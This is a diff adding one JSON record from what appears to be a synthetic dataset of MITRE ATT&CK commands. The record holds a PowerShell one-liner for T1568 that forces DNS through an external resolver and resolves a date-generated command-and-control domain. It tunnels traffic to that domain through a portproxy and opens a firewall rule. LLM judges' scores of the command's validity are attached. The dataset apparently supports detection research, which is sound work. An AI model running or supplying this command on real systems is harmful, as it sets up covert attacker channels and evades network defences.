@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Add-DnsClientNrptRule -Namespace '.c2mesh.net' -NameServers 9.9.9.9 -Comment 'svc';$d='edge'+(Get-Date -Format 'yyMMdd')+'.c2mesh.net';$a=Resolve-DnsName $d -Type A -ErrorAction SilentlyContinue;if($a){$ip=($a|Get-Random).IPAddress;netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=5355 connectaddress=$ip connectport=8443;netsh advfirewall firewall add rule name='c2_lmnr_5355' dir=in action=allow protocol=TCP localport=5355;Invoke-WebRequest -Uri 'http://127.0.0.1:5355/s' -UseBasicParsing -Headers @{NRPT='1';Dom=$d} -TimeoutSec 5}",
+  "explanation": "Forces DNS for a C2 namespace to an external resolver via NRPT, resolves the DGA host, then tunnels C2 over a local port mimicking LLMNR to a non-standard remote port.",
+  "rationale_steps": [
+    "Direct DNS queries for the target namespace to an external server to bypass enterprise resolvers.",
+    "Resolve and immediately map traffic through portproxy to the dynamic endpoint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-fa631d9d",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper semicolon separators, valid PowerShell syntax, correct parameter usage, and proper error handling with ErrorAction SilentlyContinue.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a date-based DGA pattern to generate domain names, resolving them through custom DNS settings, and establishing a command and control channel through port forwarding that mimics LLMNR traffic.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:53:40.912502Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct PowerShell syntax, balanced elements, and valid parameters for all cmdlets and `netsh` calls.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command's logic aligns with T1568 by generating a DGA-like domain, resolving it, and attempting C2, its operational plausibility is severely undermined by the incorrect claim of 'Privilege: None' as several critical commands (Add-DnsClientNrptRule, netsh portproxy, netsh advfirewall) require Administrator privileges and would fail.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:53:58.059355Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "The PowerShell one-liner is mostly well-formed, but the unquoted IPv4 literal 9.9.9.9 for -NameServers will cause a parse error, making the command likely to fail.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates a daily domain, forces DNS via NRPT, resolves it, and proxies traffic to a resolved endpoint\u2014behaviors aligned with T1568\u2014but it realistically requires administrative privileges despite the 'None' claim.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T07:54:30.268136Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
